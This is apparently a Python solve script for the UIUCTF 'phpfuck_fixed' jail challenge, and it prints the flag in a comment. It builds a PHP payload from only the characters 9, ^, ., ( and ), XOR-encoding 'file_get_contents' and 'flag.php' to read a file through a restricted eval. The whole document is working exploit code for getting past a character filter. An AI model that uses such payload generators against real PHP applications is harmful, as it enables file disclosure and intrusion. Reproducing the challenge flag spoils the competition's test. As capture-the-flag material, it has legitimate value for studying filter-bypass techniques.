# phpfuck_fixed (Jail 449)
# uiuctf{pl3as3_n0_m0rE_pHpee_9f4e3058}

from pwn import xor
import itertools

chars = {
    b"1": "(999999999999999999999999)",
    b"I": "(9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999)",
    b"0": "(9^9)",
    b"-": "(9999999999999999999^9)",
    b"3": "(999999999999999999999^9)",
    b"2": "(999999999999999999999999^9)",
    b"5": "(999999999999999999999999999999^9)",
    b"9": "(9)",
    b"4": "(9999999999999999999999999999^9)",
    b"7": "(99999999999999999999999999999^9)",
    b"6": "(999999999999999999^99999999999999999999999999999)",
    b"8": "(99999999999999999999^9999999999999999999999)"
}

NULL_STR = "((((9).(9))^((9).(9))^((9^9).(9999999999999999999^9))^((999999999999999999999999999^99999999999999999999999999999).(9))^((999999999999999999999999999999^999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))).(((9).(9))^((9).(9))^((9999999999999999999^99999999999999999999999999999).(9))^((9).(9999999999999999999^9))^((999999999999999999999^99999999999999999999999).(9))^((9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))))()"
SINGLE_Z = "(" + NULL_STR + ".(9^9))"
SINGLE_NULL = "(" + SINGLE_Z + "^" + SINGLE_Z + ")"

def _generate(cs, target):
    for i in range(2, len(cs)):
        for p in itertools.combinations(cs, i):
            s = xor(*p)
            if s == target:
                return p

def w(cs):
    return "(%s.(9))" % cs

def generate(cs, target, p):
    g = _generate(cs, target);
    print(g)
    r = "^".join(w(cs[p]) for p in g)
    return "((" + r + ")^" + SINGLE_NULL + ("." + SINGLE_NULL)*p + ")"

def solve_for_str(target):
    res = [generate(chars, c.encode(), 0) for c in target]
    return ".".join(res)

# file_get_contents("flag.php")

f1 = solve_for_str("flag.php")
f2 = solve_for_str("file_get_contents")
assert(len(set(f1)) == 5)
assert(len(set(f2)) == 5)
with open("phpfuck.txt", "w") as f:
    f.write("x=")
    f.write("(" + f2+")("+f1+")")
